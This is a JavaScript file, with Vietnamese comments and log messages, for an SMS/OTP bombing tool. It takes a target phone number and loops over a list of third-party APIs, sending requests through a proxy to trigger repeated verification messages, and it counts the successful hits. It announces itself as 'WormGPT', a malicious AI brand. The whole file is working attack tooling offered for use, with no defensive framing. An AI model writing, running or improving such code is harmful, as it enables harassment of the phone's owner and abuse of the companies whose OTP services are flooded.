// ===== DOM =====
const logBox = document.getElementById('logBox');
const sc = document.getElementById('sc');
const fc = document.getElementById('fc');
let successCount = 0, failCount = 0;
let running = false, stopRequested = false;

function addLog(msg, type = 'info') {
    const div = document.createElement('div');
    div.className = 'log-item';
    div.innerHTML = `<span class="${type}">${msg}</span>`;
    logBox.appendChild(div);
    logBox.scrollTop = logBox.scrollHeight;
    while (logBox.children.length > 200) logBox.removeChild(logBox.firstChild);
}

// ===== GỌI API QUA PROXY VERCEL =====
async function callApi(api, phone) {
    try {
        let url = api.url;
        let body = null;
        const headers = { ...api.headers };
        if (api.buildUrl) {
            url = api.buildUrl(phone);
        } else if (api.body) {
            body = typeof api.body === 'function' ? api.body(phone) : api.body;
        }
        // Gọi Vercel Proxy
        const res = await fetch('/api/proxy', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url, method: api.method || 'POST', headers, body })
        });
        const result = await res.json();
        const data = result.data;
        if (data && typeof data === 'string') {
            return data.includes('success') || data.includes('otp') || data.includes('OK') ? 'OK' : 'FAIL';
        }
        if (data && typeof data === 'object') {
            return data.success === true || data.status === 0 || data.code === 0 || data.otpTrackingId ? 'OK' : 'FAIL';
        }
        return 'FAIL';
    } catch(e) {
        return 'FAIL';
    }
}

// ===== SPAM =====
async function runSpam(phone, count) {
    if (running) { addLog('⚠️ Đang chạy!', 'info'); return; }
    if (!phone || phone.length < 9) { addLog('❌ SĐT không hợp lệ', 'fail'); return; }
    let total = Math.min(parseInt(count)||1, 10);
    running = true; stopRequested = false;
    successCount = 0; failCount = 0;
    sc.textContent = '0'; fc.textContent = '0';
    addLog(`🚀 Spam ${total} lượt cho ${phone} (${API_LIST.length} API)`, 'info');

    for (let i = 0; i < total; i++) {
        if (stopRequested) break;
        addLog(`--- Lượt ${i+1}/${total} ---`, 'info');
        for (let j = 0; j < API_LIST.length; j++) {
            if (stopRequested) break;
            const api = API_LIST[j];
            try {
                const result = await callApi(api, phone);
                if (result === 'OK') { successCount++; addLog(`✅ ${api.name}`, 'success'); } 
                else { failCount++; addLog(`❌ ${api.name}`, 'fail'); }
                sc.textContent = successCount;
                fc.textContent = failCount;
            } catch(e) { failCount++; fc.textContent = failCount; }
            await new Promise(r => setTimeout(r, 20));
        }
        if (i < total-1 && !stopRequested) await new Promise(r => setTimeout(r, 300));
    }
    running = false;
    addLog(`🏁 Xong! ✅${successCount} ❌${failCount}`, successCount > failCount ? 'success' : 'fail');
}

// ===== SỰ KIỆN =====
document.getElementById('startBtn').onclick = () => runSpam(document.getElementById('phoneInput').value.trim(), document.getElementById('countInput').value);
document.getElementById('clearBtn').onclick = () => { logBox.innerHTML = ''; addLog('🗑️ Đã xóa log', 'info'); };
document.getElementById('stopBtn').onclick = () => { stopRequested = true; running = false; addLog('⏹️ Đã dừng', 'fail'); };

addLog('🔥 WormGPT sẵn sàng!', 'info');
